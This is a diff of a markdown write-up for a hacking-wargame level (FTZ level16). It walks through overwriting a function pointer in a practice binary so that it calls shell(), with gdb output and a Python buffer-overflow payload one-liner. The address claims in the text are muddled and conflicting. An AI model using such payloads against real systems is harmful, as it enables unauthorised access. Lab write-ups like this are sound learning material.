@@ -104,12 +104,9 @@ AAAA
 
 (gdb) disas printit
 0x08048419 <printit+0>: push   %ebp
-
-(gdb) disas shell
-0x080483ec <shell+0>:   push   %ebp
 ```
 
-As above, I could see that the printit()'s address is 0x83e58955, and shell() is 0x080483ec.
+As above, I could see that the \*printit(0x08048419)'s address is printit(0x83e58955).
 
 ```
 [level16@ftz level16]$ gdb -q attackme
@@ -127,9 +124,9 @@ As above, I could see that the printit()'s address is 0x83e58955, and shell() is
 
 ```
 
-The point is that you need change to \*printit()'s address to shell()'s adress.
+The point is that you need to change \*printit()'s address to shell()'s adress.
 
-The attack code will be 40 bytes dummy strings + shell adress(0x080484d0).
+The attack code will be 40 bytes dummy strings + shell()'s adress(0x080484d0).
 
 ```
 [level16@ftz level16]$ (python -c 'print "A"*40+"\xd0\x84\x04\x08"'; cat) | ./attackme
